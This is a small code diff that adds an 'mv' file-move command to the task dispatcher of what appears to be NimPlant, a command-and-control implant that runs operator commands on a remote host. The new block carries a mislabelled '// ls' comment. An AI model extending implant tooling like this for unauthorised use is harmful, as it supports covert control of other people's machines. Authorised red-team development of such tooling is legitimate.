@@ -412,6 +412,11 @@ bool ExecuteTaskForNimPlantClient(struct Relocatable* context, struct NimPlantCo
     bCompare = context->functions.strcmp(lpTask->command, LsCommand);
     if (bCompare == 0) return CommandLs(context, config, client, lpTask);
 
+    // ls
+    DEFINE_STRING(MvCommand, "mv");
+    bCompare = context->functions.strcmp(lpTask->command, MvCommand);
+    if (bCompare == 0) return CommandMv(context, config, client, lpTask);
+
     // pwd
     DEFINE_STRING(PwdCommand, "pwd");
     bCompare = context->functions.strcmp(lpTask->command, PwdCommand);
